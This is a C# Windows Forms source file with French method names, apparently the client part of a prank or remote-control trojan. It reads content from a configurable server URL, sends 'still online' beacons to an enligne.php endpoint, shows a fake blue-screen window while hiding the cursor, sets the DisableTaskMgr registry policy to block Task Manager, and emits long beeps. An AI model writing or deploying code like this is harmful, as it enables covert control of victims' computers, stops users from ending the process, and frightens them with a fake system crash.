using System;
using System.Net;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using Microsoft.Win32;

namespace WindowsFormsApplication2
{
    class Source
    {
        private String url;
        private WebClient client = new WebClient();

        public Source()
        {
            this.url = null;
        }

        public Source(String url)
        {
            this.url = url;
        }

        public void changerUrl(String nouveauUrl)
        {
            this.url = nouveauUrl;
        }

        public String afficherSource(String page)
        {
            return this.client.DownloadString(this.url+page);
        }

        public void ouvrirPage(String param)
        {
            var _request = (HttpWebRequest)WebRequest.Create(this.url+param);
            var _response = (HttpWebResponse)_request.GetResponse();
        }

        public void tjrsEnLigne(String param)
        {
            var _request = (HttpWebRequest)WebRequest.Create(this.url+"/enligne.php?nom=" + param);
            var _response = (HttpWebResponse)_request.GetResponse();
        }

        public void ecranBleu()
        {
            Form2 bsod = new Form2();
            Cursor.Hide();
            bsod.Show();
            bsod.Activate();
        }

        public void desactiverTaskMgr()
        {
            RegistryKey _key = Registry.CurrentUser.OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\System", true);

            _key.SetValue("DisableTaskMgr", 1);
        }

        public void activerTaskMgr()
        {
            RegistryKey _key = Registry.CurrentUser.OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\System", true);

            _key.SetValue("DisableTaskMgr", 0);
        }

        public void bip()
        {
            Console.Beep(500, 3000);
        }
    }
}

